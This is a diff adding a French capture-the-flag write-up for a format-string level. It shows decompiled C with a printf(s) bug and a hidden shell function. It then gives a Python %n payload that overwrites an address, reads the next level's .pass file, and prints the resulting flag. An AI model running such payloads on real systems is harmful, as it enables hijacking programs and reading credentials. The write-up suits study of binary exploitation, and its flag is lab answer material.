@@ -1,3 +1,53 @@
+# Rapport CTF - [Level05]
+
+### Observation :
+En arrivant sur le level4 on trouve un executable nommé level4.\
+Quand nous essayons de le lancer avec un argument le programme nous renvois juste notre propre chaine de caractere puis se ferme, comme sur le level precedant. \
+Regardons donc avec gdb ou un decompilateur.
+
+
+### Explication de Code :
+En lancant le binaire dans hex-ray ou ghidra nous obtenons :
+```c
+void __noreturn o()
+{
+  system("/bin/sh");
+  _exit(1);
+}
+// 80484A4: using guessed type void __noreturn o();
+
+//----- (080484C2) --------------------------------------------------------
+void __noreturn n()
+{
+  char s[520]; // [esp+10h] [ebp-208h] BYREF
+
+  fgets(s, 512, stdin);
+  printf(s);
+  exit(1);
+}
+
+//----- (08048504) --------------------------------------------------------
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  n();
+}
+```
+Nous pouvons voir une fonction non utiliser `o()` qui nous permet d'acceder a un shell. \
+Le but est de jump dans cette fonction en utilisant printf.
+
+
+### Solution :
+
+On fait la commande suivante pour obtenir le flag :
+```sh
+(python -c "print('\x38\x98\x04\x08' + 'A'*4 + '\x39\x98\x04\x08' + 'A'*4 + '\x3a\x98\x04\x08' + '%8.x'*3 + 'A'*120 + '%n' + '%992.x' + '%n' + '%896.x' + '%n')"; echo "cat /home/user/level6/.pass") | ./level5
+```
+
+### Resultat :
+```sh
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
 
 printf adrr = 0x8048380 = \x80\x83\x04\x08 
 
